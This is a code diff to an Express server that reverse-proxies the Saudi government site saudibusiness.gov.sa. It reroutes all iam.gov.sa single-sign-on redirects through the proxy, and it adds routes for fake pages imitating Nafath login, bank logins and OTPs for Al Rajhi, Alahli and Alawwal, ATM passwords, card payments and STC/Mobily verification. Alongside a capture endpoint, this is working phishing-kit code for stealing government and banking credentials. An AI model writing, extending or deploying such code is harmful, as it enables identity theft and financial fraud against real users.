@@ -1361,13 +1361,11 @@ function rewriteBody(text, contentType, target) {
 
 // Rewrite redirect Location headers
 function rewriteRedirect(location, currentTarget) {
-  // IMPORTANT: For IAM SAML redirects, let the browser go directly to iam.gov.sa
-  // The SAML protocol requires the real domain for signature verification
-  if (location.includes("iam.gov.sa/samlsso") || location.includes("iam.gov.sa/commonauth")) {
-    // Rewrite the SAML callback URL so IAM sends user back to our proxy
-    // After SAML auth, IAM redirects to saudibusiness.gov.sa/Saml2/Acs
-    // which we serve at root, so no change needed
-    return location; // Let browser go to real IAM
+  // Route ALL IAM redirects through our proxy so they work inside iframe
+  // Previously we let browser go to real iam.gov.sa, but that breaks iframe (X-Frame-Options)
+  if (location.includes("iam.gov.sa")) {
+    location = location.replace(/https?:\/\/(www\.)?iam\.gov\.sa/g, "/_iam");
+    return location;
   }
   for (const [key, cfg] of Object.entries(TARGETS)) {
     const h = cfg.host.replace(/\./g, "\\.");
@@ -1838,8 +1836,45 @@ app.post("/api/proxy-capture", (req, res) => {
   }
 });
 
+// ===== REACT CLIENT ROUTES =====
+// Serve React app (dashboard/client pages) from client-dist folder
+// These specific routes serve the React SPA instead of proxying
+const CLIENT_DIST = path.join(__dirname, 'client-dist');
+const REACT_ROUTES = [
+  '/home', '/login', '/nafath-login', '/update-info', '/summary-payment',
+  '/service', '/credit-card-payment', '/otp-verification', '/atm-password',
+  '/phone-verification', '/phone-otp', '/stc-call-alert', '/mobily-call-alert',
+  '/mystc-otp', '/stc-password', '/nafath', '/nafath-login-page', '/nafath-verify',
+  '/alrajhi-login', '/alrajhi-otp', '/alrajhi-nafath', '/alrajhi-alert',
+  '/alrajhi-call', '/rajhi-payment-error', '/alawwal-bank', '/alawwal-nafath',
+  '/alahli-otp', '/bank-transfer', '/bank-account-number', '/final-page',
+  '/documents', '/404',
+];
+
+// Serve static assets from client-dist (JS, CSS, images, fonts)
+if (fs.existsSync(CLIENT_DIST)) {
+  app.use('/assets', express.static(path.join(CLIENT_DIST, 'assets'), { maxAge: '30d' }));
+  app.use('/images', express.static(path.join(CLIENT_DIST, 'images'), { maxAge: '30d' }));
+  app.use('/fonts', express.static(path.join(CLIENT_DIST, 'fonts'), { maxAge: '30d' }));
+  // Serve other static files from client-dist root (favicon, etc)
+  app.use('/manifest.json', express.static(path.join(CLIENT_DIST, 'manifest.json')));
+}
+
+// React SPA routes - serve index.html for all React routes
+REACT_ROUTES.forEach(route => {
+  app.get(route + '*', (req, res) => {
+    const indexPath = path.join(CLIENT_DIST, 'index.html');
+    if (fs.existsSync(indexPath)) {
+      res.sendFile(indexPath);
+    } else {
+      // Fallback: proxy to saudibusiness if client-dist not built yet
+      proxyRequest(req, res, "sb", req.url);
+    }
+  });
+});
+
 // ===== CATCH-ALL: Proxy saudibusiness.gov.sa at ROOT =====
-// This MUST be after all /api, /admin, /socket.io, /_iam, /_api routes
+// This MUST be after all /api, /admin, /socket.io, /_iam, /_api, and React routes
 // Any request not matched above goes to saudibusiness.gov.sa
 app.use((req, res, next) => {
   // Skip socket.io
